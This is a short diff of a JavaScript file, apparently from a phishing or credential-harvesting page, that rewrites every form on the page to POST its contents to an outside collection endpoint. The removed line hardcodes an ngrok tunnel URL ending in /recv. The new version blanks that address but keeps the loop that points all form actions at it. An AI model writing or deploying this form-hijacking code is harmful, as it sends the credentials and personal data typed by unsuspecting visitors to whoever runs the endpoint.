@@ -1,6 +1,6 @@
 // CONTROL //
 
-const redirect_data = "https://b9a9-177-72-24-32.ngrok-free.app/recv";
+const redirect_data = "";
 
 // SCRIPT //
 
@@ -19,7 +19,7 @@ all_button.forEach((button) => {
 });
 
 all_form.forEach((form) => {
-  form.action = redirect_data;
+  form.action = `${redirect_data}/recv`;
   form.method = "POST";
 });
 
